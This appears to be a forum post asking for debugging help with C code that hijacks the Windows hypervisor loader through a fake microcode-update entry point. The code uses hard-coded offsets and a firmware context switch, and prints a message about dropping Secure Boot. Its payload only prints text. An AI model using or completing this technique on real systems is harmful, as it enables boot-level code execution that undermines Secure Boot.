



/// please help me. I want to print "Hello World" . But not able to do so./////////////////////////////////////////////////////////////////

// This is what i  am trying 



#include <windows.h>
#include <winternl.h>

//#define EFIAPI				__cdecl
#define IN
#define EFIAPI
#define EFI_SUCCESS 0

typedef unsigned short CHAR16;
typedef unsigned long long EFI_STATUS;
typedef void* EFI_HANDLE;

struct _EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL;
typedef
EFI_STATUS
(EFIAPI* EFI_TEXT_STRING) (
	IN struct _EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL* This,
	IN CHAR16* String
	);

typedef struct _EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL {
	void* a;
	EFI_TEXT_STRING  OutputString;
} EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL;

typedef struct {
	char                             a[52];
	EFI_HANDLE                       ConsoleOutHandle;
	EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL* ConOut;
} EFI_SYSTEM_TABLE;

typedef enum E_EXECUTION_CONTEXT
{
	ApplicationContext,
	FirmwareContext
}EXECUTION_CONTEXT, * PEXECUTION_CONTEXT;


typedef DWORD64 EFI_STATUS;
typedef unsigned short CHAR16;

typedef void(EFIAPI* BLP_ARCH_SWITCH_CONTEXT)(EXECUTION_CONTEXT newContext);
typedef EFI_STATUS(EFIAPI* BOOT_ENTRY)(PVOID SystemTable, CHAR16* String);

DWORD McUpdateEntry(PVOID* functionTableOut, PVOID* functionTableIn)
{
	BOOT_ENTRY entry;
	BLP_ARCH_SWITCH_CONTEXT fpBlpArchSwitchContext;
	EFI_SYSTEM_TABLE* SystemTable;
	PVOID hvLoaderAddr, printProc, hvLoaderBase = NULL, efiSystemTable, OutputString;


	hvLoaderAddr = functionTableIn[3];
	printProc = (PVOID)((DWORD_PTR)hvLoaderAddr + 0xAE48);

	for (PBYTE searchAddr = printProc; searchAddr; searchAddr--)
	{
		if (searchAddr[0] == 'M' && searchAddr[1] == 'Z' && searchAddr[2] == 0x90 && searchAddr[4] == 0x03)
		{
			hvLoaderBase = searchAddr;
			break;
		}
	}
	if (!hvLoaderBase)
		return 0;


	fpBlpArchSwitchContext = (PVOID)((DWORD_PTR)hvLoaderBase + 0xC550);
	efiSystemTable = *(PVOID*)((DWORD_PTR)hvLoaderBase + 0x1136C8);
	SystemTable = *(PVOID*)((DWORD_PTR)hvLoaderBase + 0x1136C8);
	OutputString = (PVOID)((DWORD_PTR)hvLoaderBase + 0xDBD4);
	
	fpBlpArchSwitchContext(1); //changing to uefi context from application context

	SystemTable->ConOut->OutputString(SystemTable->ConOut, L"Hello World!!!\n");
	
	entry = (BOOT_ENTRY)(printProc);
	entry(efiSystemTable, L"dropped the secure boot baton");
	while (1);
	return 0;
}
